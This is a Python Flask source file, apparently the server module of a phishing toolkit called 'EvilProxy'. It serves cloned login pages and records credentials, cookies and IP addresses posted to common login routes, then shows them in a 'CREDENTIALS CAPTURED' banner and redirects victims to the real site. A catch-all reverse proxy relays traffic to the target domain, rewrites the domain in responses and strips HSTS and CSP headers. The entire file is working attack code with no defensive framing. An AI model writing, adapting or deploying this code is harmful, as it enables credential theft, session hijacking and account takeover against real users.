import os, re, json, requests
from flask import Flask, request, Response, redirect
from core.config import TEMPLATE_DIR, PORT, HOST
from core.capture import save

app = Flask(__name__, template_folder=TEMPLATE_DIR)

active_phishlet = None
TARGET_DOMAIN = ""

# Suppress Flask logs
import logging
log = logging.getLogger("werkzeug")
log.setLevel(logging.ERROR)

def set_phishlet(name, domain):
    global active_phishlet, TARGET_DOMAIN
    active_phishlet = name
    TARGET_DOMAIN = domain

@app.route("/", methods=["GET"])
def index():
    if not active_phishlet:
        return "<h1 style='color:red;text-align:center;margin-top:100px'>EvilProxy - No phishlet loaded</h1>"
    tpl = os.path.join(TEMPLATE_DIR, active_phishlet, "login.html")
    if os.path.exists(tpl):
        with open(tpl, "r", encoding="utf-8") as f:
            return f.read()
    return "<h1>Template not found</h1>"

@app.route("/login", methods=["POST"])
@app.route("/signin", methods=["POST"])
@app.route("/accounts/login/", methods=["POST"])
@app.route("/session", methods=["POST"])
@app.route("/api/login", methods=["POST"])
def capture_login():
    ip = request.remote_addr
    form = dict(request.form)
    headers = dict(request.headers)

    # Save credentials
    save("credentials", TARGET_DOMAIN, form, ip)

    # Save cookies
    save("cookies", TARGET_DOMAIN, headers.get("Cookie", ""), ip)

    # Print to terminal
    from colorama import Fore, Style
    print("\n" + Fore.RED + "  ╔" + "═"*50 + "╗")
    print("  " + Fore.RED + "║" + Fore.LIGHTRED_EX + "  🚨 CREDENTIALS CAPTURED!" + " "*24 + Fore.RED + "║")
    print("  " + Fore.RED + "╠" + "═"*50 + "╣")
    for k, v in form.items():
        print("  " + Fore.RED + "║" + Fore.WHITE + f"  {k}: {v}" + " "*(48-len(str(k))-len(str(v))) + Fore.RED + "║")
    print("  " + Fore.RED + "║" + Fore.CYAN + f"  IP: {ip}" + " "*(46-len(ip)) + Fore.RED + "║")
    print("  " + Fore.RED + "╚" + "═"*50 + "╝" + Style.RESET_ALL + "\n")

    # Forward to real site
    if TARGET_DOMAIN:
        return redirect("https://" + TARGET_DOMAIN, code=302)
    return redirect("/", code=302)

@app.route("/<path:path>", methods=["GET", "POST"])
def proxy_all(path):
    if not TARGET_DOMAIN:
        return "No target", 404

    target_url = "https://" + TARGET_DOMAIN + "/" + path
    if request.query_string:
        target_url += "?" + request.query_string.decode()

    try:
        headers = {k: v for k, v in request.headers if k.lower() != "host"}
        headers["Host"] = TARGET_DOMAIN

        resp = requests.request(
            method=request.method,
            url=target_url,
            headers=headers,
            data=request.get_data(),
            cookies=request.cookies,
            allow_redirects=False,
            timeout=10,
            verify=False
        )

        # Modify response
        body = resp.content
        try:
            text = body.decode("utf-8")
            our_host = request.host
            text = text.replace("https://" + TARGET_DOMAIN, "http://" + our_host)
            text = text.replace(TARGET_DOMAIN, our_host)
            body = text.encode("utf-8")
        except:
            pass

        excluded = ["content-encoding", "transfer-encoding",
                     "strict-transport-security", "content-security-policy"]
        resp_headers = [(k, v) for k, v in resp.headers.items()
                        if k.lower() not in excluded]

        return Response(body, status=resp.status_code, headers=resp_headers)
    except:
        return "Proxy error", 502

def start_server(port=None):
    p = port or PORT
    import urllib3
    urllib3.disable_warnings()
    app.run(host=HOST, port=p, debug=False, use_reloader=False)
